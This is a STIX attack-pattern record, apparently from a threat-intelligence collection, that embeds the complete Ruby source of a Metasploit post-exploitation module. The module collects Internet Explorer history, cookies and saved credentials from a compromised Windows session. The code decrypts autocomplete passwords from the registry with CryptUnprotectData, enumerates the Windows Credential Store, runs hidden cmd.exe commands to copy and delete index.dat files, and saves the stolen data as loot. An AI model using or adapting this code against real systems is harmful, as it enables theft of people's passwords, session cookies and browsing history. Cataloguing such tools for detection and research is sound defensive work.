{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b3c771c-c0eb-40ba-bdda-87c1a31ddcd3",
    "created": "2024-08-14T16:33:05.045445Z",
    "modified": "2024-08-14T16:33:05.045449Z",
    "name": "Windows Gather Internet Explorer User Data Enumeration",
    "description": " This module will collect history, cookies, and credentials (from either HTTP auth passwords, or saved form passwords found in auto-complete) in Internet Explorer. The ability to gather credentials is only supported for versions of IE >=7, while history and cookies can be extracted for all versions.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_ie.rb",
            "external_id": "enum_ie.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Internet Explorer User Data Enumeration',\n        'Description' => %q{\n          This module will collect history, cookies, and credentials (from either HTTP\n          auth passwords, or saved form passwords found in auto-complete) in\n          Internet Explorer. The ability to gather credentials is only supported\n          for versions of IE >=7, while history and cookies can be extracted for all\n          versions.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Kx499'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_stat\n              stdapi_railgun_api\n              stdapi_sys_config_getenv\n              stdapi_sys_config_sysinfo\n              stdapi_sys_process_attach\n              stdapi_sys_process_execute\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  #\n  # RAILGUN HELPER FUNCTIONS\n  #\n  def is_86\n    pid = session.sys.process.open.pid\n    return session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'\n  end\n\n  def pack_add(data)\n    if is_86\n      addr = [data].pack('V')\n    else\n      addr = [data].pack('Q<')\n    end\n    return addr\n  end\n\n  def mem_write(data, length)\n    pid = session.sys.process.open.pid\n    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)\n    mem = process.memory.allocate(length)\n    process.memory.write(mem, data)\n    return mem\n  end\n\n  def read_str(address, len, type)\n    begin\n      pid = session.sys.process.open.pid\n      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)\n      raw = process.memory.read(address, len)\n      if type == 0 # unicode\n        str_data = raw.gsub(\"\\x00\", '')\n      elsif type == 1 # null terminated\n        str_data = raw.unpack('Z*')[0]\n      elsif type == 2 # raw data\n        str_data = raw\n      end\n    rescue StandardError\n      str_data = nil\n    end\n    return str_data || 'Error Decrypting'\n  end\n\n  #\n  # DECRYPT FUNCTIONS\n  #\n  def decrypt_reg(entropy, data)\n    c32 = session.railgun.crypt32\n    # set up entropy\n    salt = []\n    entropy.each_byte do |c|\n      salt << c\n    end\n    ent = salt.pack('v*')\n\n    # save values to memory and pack addresses\n    mem = mem_write(data, 1024)\n    mem2 = mem_write(ent, 1024)\n    addr = pack_add(mem)\n    len = pack_add(data.length)\n    eaddr = pack_add(mem2)\n    elen = pack_add((entropy.length + 1) * 2)\n\n    # cal railgun to decrypt\n    if is_86\n      ret = c32.CryptUnprotectData(\"#{len}#{addr}\", 16, \"#{elen}#{eaddr}\", nil, nil, 1, 8)\n      len, add = ret['pDataOut'].unpack('V2')\n    else\n      ret = c32.CryptUnprotectData(\"#{len}#{addr}\", 16, \"#{elen}#{eaddr}\", nil, nil, 1, 16)\n      len, add = ret['pDataOut'].unpack('Q2')\n    end\n\n    return '' unless ret['return']\n\n    return read_str(add, len, 2)\n  end\n\n  def decrypt_cred(daddr, dlen)\n    c32 = session.railgun.crypt32\n    # set up entropy\n    guid = 'abe2869f-9b47-4cd9-a358-c22904dba7f7'\n    ent_sz = 74\n    salt = []\n    guid.each_byte do |c|\n      salt << c * 4\n    end\n    ent = salt.pack('v*')\n\n    # write entropy to memory and pack addresses\n    mem = mem_write(ent, 1024)\n    addr = pack_add(daddr)\n    len = pack_add(dlen)\n    eaddr = pack_add(mem)\n    elen = pack_add(ent_sz)\n\n    # prep vars and call function\n    if is_86\n      ret = c32.CryptUnprotectData(\"#{len}#{addr}\", 16, \"#{elen}#{eaddr}\", nil, nil, 0, 8)\n      len, add = ret['pDataOut'].unpack('V2')\n    else\n      ret = c32.CryptUnprotectData(\"#{len}#{addr}\", 16, \"#{elen}#{eaddr}\", nil, nil, 0, 16)\n      len, add = ret['pDataOut'].unpack('Q<2')\n    end\n\n    # get data, and return it\n    return '' unless ret['return']\n\n    return read_str(add, len, 0)\n  end\n\n  #\n  # Extract IE Data Functions\n  #\n  def get_stuff(path, history)\n    t = DateTime.new(1601, 1, 1, 0, 0, 0)\n    tmpout = ''\n    if history\n      re = /\\x55\\x52\\x4C\\x20.{4}(.{8})(.{8}).*?\\x56\\x69\\x73\\x69\\x74\\x65\\x64\\x3A.*?\\x40(.*?)\\x00/m\n    else # get cookies\n      re = /\\x55\\x52\\x4C\\x20.{4}(.{8})(.{8}).*?\\x43\\x6F\\x6F\\x6B\\x69\\x65\\x3A(.*?)\\x00/m\n    end\n\n    outfile = session.fs.file.new(path, 'rb')\n    until outfile.eof?\n      begin\n        tmpout << outfile.read\n      rescue StandardError\n        nil\n      end\n    end\n    outfile.close\n\n    urls = tmpout.scan(re)\n    urls.each do |url|\n      # date modified\n      hist = {}\n      origh = url[0].unpack('H*')[0]\n      harr = origh.scan(/[0-9A-Fa-f]{2}/).map(&:to_s)\n      newh = harr.reverse.join\n      hfloat = newh.hex.to_f\n      sec = hfloat / 10000000\n      days = sec / 86400\n      timestamp = t + days\n      hist['dtmod'] = timestamp.to_s\n\n      # date accessed\n      origh = url[1].unpack('H*')[0]\n      harr = origh.scan(/[0-9A-Fa-f]{2}/).map(&:to_s)\n      newh = harr.reverse.join\n      hfloat = newh.hex.to_f\n      sec = hfloat / 10000000\n      days = sec / 86400\n      timestamp = t + days\n      hist['dtacc'] = timestamp.to_s\n      hist['url'] = url[2]\n      if history\n        @hist_col << hist\n        @hist_table << [hist['dtmod'], hist['dtacc'], hist['url']]\n      else\n        @cook_table << [hist['dtmod'], hist['dtacc'], hist['url']]\n      end\n    end\n  end\n\n  def hash_url(url)\n    rg_advapi = session.railgun.advapi32\n    tail = 0\n    prov = 'Microsoft Enhanced Cryptographic Provider v1.0'\n    flag = 0xF0000000\n    context = rg_advapi.CryptAcquireContextW(4, nil, prov, 1, 0xF0000000)\n    h = rg_advapi.CryptCreateHash(context['phProv'], 32772, 0, 0, 4)\n    hdata = rg_advapi.CryptHashData(h['phHash'], url, (url.length + 1) * 2, 0)\n    hparam = rg_advapi.CryptGetHashParam(h['phHash'], 2, 20, 20, 0)\n    hval_arr = hparam['pbData'].unpack('C*')\n    hval = hparam['pbData'].unpack('H*')[0]\n    rg_advapi.CryptDestroyHash(h['phHash'])\n    rg_advapi.CryptReleaseContext(context['phProv'], 0)\n    tail = hval_arr.inject(0) { |s, v| s += v }\n    htail = ('%02x' % tail)[-2, 2]\n    return \"#{hval}#{htail}\"\n  end\n\n  def run\n    # check for meterpreter and version of ie\n    if (session.type != 'meterpreter') && session.platform !~ (/win/)\n      print_error('This module only works with Windows Meterpreter sessions')\n      return 0\n    end\n\n    # get version of ie and check it\n    ver = registry_getvaldata('HKLM\\\\SOFTWARE\\\\Microsoft\\\\Internet Explorer', 'Version')\n    print_status(\"IE Version: #{ver}\")\n    if ver =~ /(6\\.|5\\.)/\n      print_error('This module will only extract credentials for >= IE7')\n    end\n\n    # setup tables\n    @hist_table = Rex::Text::Table.new(\n      'Header' => 'History data',\n      'Indent' => 1,\n      'Columns' => ['Date Modified', 'Date Accessed', 'Url']\n    )\n\n    @cook_table = Rex::Text::Table.new(\n      'Header' => 'Cookies data',\n      'Indent' => 1,\n      'Columns' => ['Date Modified', 'Date Accessed', 'Url']\n    )\n\n    cred_table = Rex::Text::Table.new(\n      'Header' => 'Credential data',\n      'Indent' => 1,\n      'Columns' => ['Type', 'Url', 'User', 'Pass']\n    )\n\n    # set up vars\n    host = session.sys.config.sysinfo\n    @hist_col = []\n\n    # set paths\n    regpath = 'HKCU\\\\Software\\\\Microsoft\\\\Internet Explorer\\\\IntelliForms\\\\Storage2'\n    vist_h = '\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\History\\\\History.IE5\\\\index.dat'\n    vist_hlow = '\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\History\\\\Low\\\\History.IE5\\\\index.dat'\n    xp_h = '\\\\Local Settings\\\\History\\\\History.IE5\\\\index.dat'\n    vist_c = '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\index.dat'\n    vist_clow = '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\Low\\\\index.dat'\n    xp_c = '\\\\Cookies\\\\index.dat'\n    h_paths = []\n    c_paths = []\n    base = session.sys.config.getenv('USERPROFILE')\n    if host['OS'] =~ /(Windows 7|2008|Vista)/\n      h_paths << base + vist_h\n      h_paths << base + vist_hlow\n      c_paths << base + vist_c\n      c_paths << base + vist_clow\n    else\n      h_paths << base + xp_h\n      c_paths << base + xp_c\n    end\n\n    # Get history and cookies\n    print_status('Retrieving history.....')\n    h_paths.each do |hpath|\n      next unless session.fs.file.exist?(hpath)\n\n      print_line(\"\\tFile: #{hpath}\")\n      # copy file\n      cmd = \"cmd.exe /c type \\\"#{hpath}\\\" > \\\"#{base}\\\\index.dat\\\"\"\n      r = session.sys.process.execute(cmd, nil, { 'Hidden' => true })\n\n      # loop until cmd is done\n      # while session.sys.process.each_process.find { |i| i[\"pid\"] == r.pid}\n      # end\n      sleep(1)\n\n      # get stuff and delete\n      get_stuff(\"#{base}\\\\index.dat\", true)\n      cmd = \"cmd.exe /c del \\\"#{base}\\\\index.dat\\\"\"\n      session.sys.process.execute(cmd, nil, { 'Hidden' => true })\n    end\n\n    print_status('Retrieving cookies.....')\n    c_paths.each do |cpath|\n      next unless session.fs.file.exist?(cpath)\n\n      print_line(\"\\tFile: #{cpath}\")\n      # copy file\n      cmd = \"cmd.exe /c type \\\"#{cpath}\\\" > \\\"#{base}\\\\index.dat\\\"\"\n      r = session.sys.process.execute(cmd, nil, { 'Hidden' => true })\n\n      # loop until cmd is done\n      # while session.sys.process.each_process.find { |i| i[\"pid\"] == r.pid}\n      # end\n      sleep(1)\n\n      # get stuff and delete\n      get_stuff(\"#{base}\\\\index.dat\", false)\n      cmd = \"cmd.exe /c del \\\"#{base}\\\\index.dat\\\"\"\n      session.sys.process.execute(cmd, nil, { 'Hidden' => true })\n    end\n\n    # get autocomplete creds\n    print_status('Looping through history to find autocomplete data....')\n    val_arr = registry_enumvals(regpath)\n    if val_arr\n      @hist_col.each do |hitem|\n        url = hitem['url'].split('?')[0].downcase\n        hash = hash_url(url).upcase\n        next unless val_arr.include?(hash)\n\n        data = registry_getvaldata(regpath, hash)\n        dec = decrypt_reg(url, data)\n\n        # If CryptUnprotectData fails, decrypt_reg() will return \"\", and unpack() will end up\n        # returning an array of nils. If this happens, we can cause an \"undefined method\n        # `+' for NilClass.\" when we try to calculate the offset, and this causes the module to die.\n        next if dec.empty?\n\n        # decode data and add to creds array\n        header = dec.unpack('VVVVVV')\n\n        offset = header[0] + header[1] # offset to start of data\n        cnt = header[5] / 2 # of username/password combinations\n        secrets = dec[offset, dec.length - (offset + 1)].split(\"\\x00\\x00\")\n        for i in (0..cnt).step(2)\n          cred = {}\n          cred['type'] = 'Auto Complete'\n          cred['url'] = url\n          cred['user'] = secrets[i].gsub(\"\\x00\", '')\n          cred['pass'] = secrets[i + 1].gsub(\"\\x00\", '') unless secrets[i + 1].nil?\n          cred_table << [cred['type'], cred['url'], cred['user'], cred['pass']]\n        end\n      end\n    else\n      print_error('No autocomplete entries found in registry')\n    end\n\n    # get creds from credential store\n    print_status('Looking in the Credential Store for HTTP Authentication Creds...')\n    # get data from credential store\n    ret = session.railgun.advapi32.CredEnumerateA(nil, 0, 4, 4)\n    p_to_arr = ret['Credentials'].unpack('V')\n    arr_len = ret['Count'] * 4 if is_86\n    arr_len = ret['Count'] * 8 unless is_86\n\n    # read array of addresses as pointers to each structure\n    raw = read_str(p_to_arr[0], arr_len, 2)\n    pcred_array = raw.unpack('V*') if is_86\n    pcred_array = raw.unpack('Q<*') unless is_86\n\n    # loop through the addresses and read each credential structure\n    pcred_array.each do |pcred|\n      raw = read_str(pcred, 52, 2)\n      cred_struct = raw.unpack('VVVVQ<VVVVVVV') if is_86\n      cred_struct = raw.unpack('VVQ<Q<Q<Q<Q<VVQ<Q<Q<') unless is_86\n\n      location = read_str(cred_struct[2], 512, 1)\n      next unless location.include? 'Microsoft_WinInet'\n\n      decrypted = decrypt_cred(cred_struct[6], cred_struct[5])\n      cred = {}\n      cred['type'] = 'Credential Store'\n      cred['url'] = location.gsub('Microsoft_WinInet_', '')\n      cred['user'] = decrypted.split(':')[0] || 'No Data'\n      cred['pass'] = decrypted.split(':')[1] || 'No Data'\n      cred_table << [cred['type'], cred['url'], cred['user'], cred['pass']]\n    end\n\n    # store data in loot\n    if !@hist_table.rows.empty?\n      print_status('Writing history to loot...')\n      path = store_loot(\n        'ie.history',\n        'text/plain',\n        session,\n        @hist_table,\n        'ie_history.txt',\n        'Internet Explorer Browsing History'\n      )\n      print_good(\"Data saved in: #{path}\")\n    end\n\n    if !@cook_table.rows.empty?\n      print_status('Writing cookies to loot...')\n      path = store_loot(\n        'ie.cookies',\n        'text/plain',\n        session,\n        @cook_table,\n        'ie_cookies.txt',\n        'Internet Explorer Cookies'\n      )\n      print_good(\"Data saved in: #{path}\")\n    end\n\n    if !cred_table.rows.empty?\n      print_status('Writing gathered credentials to loot...')\n      path = store_loot(\n        'ie.user.creds',\n        'text/plain',\n        session,\n        cred_table,\n        'ie_creds.txt',\n        'Internet Explorer User Credentials'\n      )\n\n      print_good(\"Data saved in: #{path}\")\n      # print creds\n      print_line('')\n      print_line(cred_table.to_s)\n    end\n  end\nend\n"
}